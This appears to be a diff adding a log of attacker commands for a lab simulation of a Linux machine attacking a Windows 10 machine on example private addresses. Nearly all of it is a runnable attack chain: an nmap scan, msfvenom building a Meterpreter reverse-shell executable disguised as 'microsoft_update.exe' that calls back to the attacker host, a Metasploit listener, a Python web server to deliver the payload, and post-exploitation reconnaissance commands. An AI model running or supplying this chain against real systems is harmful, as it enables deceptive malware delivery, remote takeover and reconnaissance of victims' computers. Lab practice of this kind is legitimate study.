@@ -1,0 +1,32 @@
+# Attacker Commands Log - Linux VM → Windows 10 Attack Simulation
+# Attacker IP: 192.168.20.11 (example)
+# Victim IP:   192.168.20.12 (example)
+
+# 1. Ports Scanning
+nmap -A -Pn -n 192.168.20.12
+
+# 2. Listing payloads
+msfvenom -l payloads
+
+# 3. Create payloads
+msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=3344 -f exe -o microsoft_update.exe
+
+# 4 Start Listener
+msfconsole
+use exploit/multi/handler
+set payload windows/x64/meterpreter_reverse_tcp 
+set lhost 192.168.20.11
+exploit
+
+# 5. Host the payload
+python3 -m http.server 9999
+
+# 6. Post-Exploitation Commands (run after gaining access)
+shell
+whoami
+ipconfig
+systeminfo
+net user
+net localgroup
+
+
